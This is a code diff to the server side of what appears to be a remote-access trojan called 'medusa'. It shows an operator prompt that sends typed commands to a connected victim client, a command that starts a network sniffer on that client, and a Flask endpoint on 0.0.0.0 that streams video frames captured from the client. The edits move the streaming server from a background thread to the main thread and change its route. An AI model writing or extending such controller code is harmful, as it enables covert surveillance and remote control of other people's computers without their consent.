@@ -10,9 +10,7 @@ from pynput import keyboard
 init(autoreset=True)
 
 app = Flask(__name__)
-server_thread = None
-stop_server_flag = threading.Event()
-ctrl_pressed = False  
+ctrl_pressed = False
 
 def on_press(key):
     global ctrl_pressed
@@ -41,20 +39,14 @@ def start_streaming(client_socket, mode):
     print(Fore.BLUE + "[ * ] Preparing player...")
     time.sleep(1)
 
-    @app.route('/video_feed')
+    @app.route('/')
     def video_feed():
         return Response(generate_frames(client_socket),
                         mimetype='multipart/x-mixed-replace; boundary=frame')
 
-    def run_server():
-        app.run(host='0.0.0.0', port=5000, use_reloader=False)
-
-    global server_thread
-    server_thread = threading.Thread(target=run_server)
-    server_thread.start()
-
-    print(Fore.BLUE + f"Opening player at: http://localhost:5000")
+    print(Fore.BLUE + f"[ * ] Opening player at: http://localhost:5000")
     print(Fore.BLUE + "[ * ] Streaming...")
+    app.run(host='0.0.0.0', port=5000)
 
 def generate_frames(client_socket):
     while True:
@@ -76,6 +68,9 @@ def handle_client(client_socket, addr):
             command = input(Fore.MAGENTA + "medusa > ")
         except EOFError:
             break
+
+        print(Fore.YELLOW + f"[ * ] Command '{command}' sent to client.")
+        client_socket.send(command.encode('utf-8'))
 
         if command == "sniffer_start":
             print(Fore.YELLOW + "[ * ] Starting network sniffer on client...")
@@ -140,7 +135,7 @@ def handle_client(client_socket, addr):
         client_socket.send(command.encode('utf-8'))
 
 def stop_server():
-    stop_server_flag.set()
+    print(Fore.RED + "[ * ] Server is stopping...")
     func = request.environ.get('werkzeug.server.shutdown')
     if func is None:
         raise RuntimeError('Not running with the Werkzeug Server')
